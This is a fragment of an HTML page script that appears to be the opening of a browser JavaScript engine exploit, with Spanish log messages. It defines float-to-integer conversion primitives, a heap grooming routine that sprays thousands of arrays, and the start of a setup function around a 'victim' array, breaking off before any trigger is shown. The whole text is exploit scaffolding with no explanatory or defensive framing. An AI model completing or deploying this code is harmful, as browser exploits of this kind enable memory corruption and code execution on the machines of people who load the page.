  <script>
    const log = (msg) => document.getElementById('log').textContent += msg + "\n";

    let buf, f64_buf, u32_buf;

    function setupConversionPrimitives() {
      buf = new ArrayBuffer(8);
      f64_buf = new Float64Array(buf);
      u32_buf = new Uint32Array(buf);
      log("🧠 Conversiones float <-> int listas.");
    }

    function f2i(f) {
      f64_buf[0] = f;
      return u32_buf[0] + u32_buf[1] * 0x100000000;
    }

    function i2f(i) {
      u32_buf[0] = i % 0x100000000;
      u32_buf[1] = i / 0x100000000;
      return f64_buf[0];
    }

    function hex(i) {
      return '0x' + i.toString(16);
    }

    function groomHeap() {
      let spray = [];
      let size = 0x1000;
      for (let i = 0; i < 0x1000; i++) {
        spray.push(new Array(size).fill(13.37));
      }
      log("🧽 Heap grooming listo con " + spray.length + " bloques.");
    }

    function setup() {
      setupConversionPrimitives();
      groomHeap();

      const victim = [1.1, 1.2, 1.3];
